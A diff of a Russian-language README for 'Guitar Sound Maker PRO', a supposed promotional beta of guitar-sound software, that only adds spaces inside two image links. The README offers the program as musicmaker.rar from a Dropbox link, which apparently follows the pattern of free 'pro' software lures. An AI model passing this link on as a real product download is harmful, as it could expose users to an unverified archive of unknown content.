@@ -1,6 +1,6 @@
 # Guitar Sound Maker ® [PRO promotional version]
 -------------
-![alt-текст](https://imgur.com/zSIAdCr)
+![alt-текст]( https://imgur.com/zSIAdCr )
 ## Guitar Sound Maker ® [PRO]
 ## Сборка гитарных звуков для создания композиций 
 ### Профессиональная Бета-версия для промоушена
@@ -14,7 +14,7 @@
 
 ## 🔐 [Guitar Sound Maker [PRO] СКАЧАТЬ](https://www.dropbox.com/s/74er08916fgp6pg/musicmaker.rar?dl=1)
 
-![alt-текст](https://imgur.com/NhnYouJ)
+![alt-текст]( https://imgur.com/NhnYouJ )
 
 ## Описание данной версии приложения
 
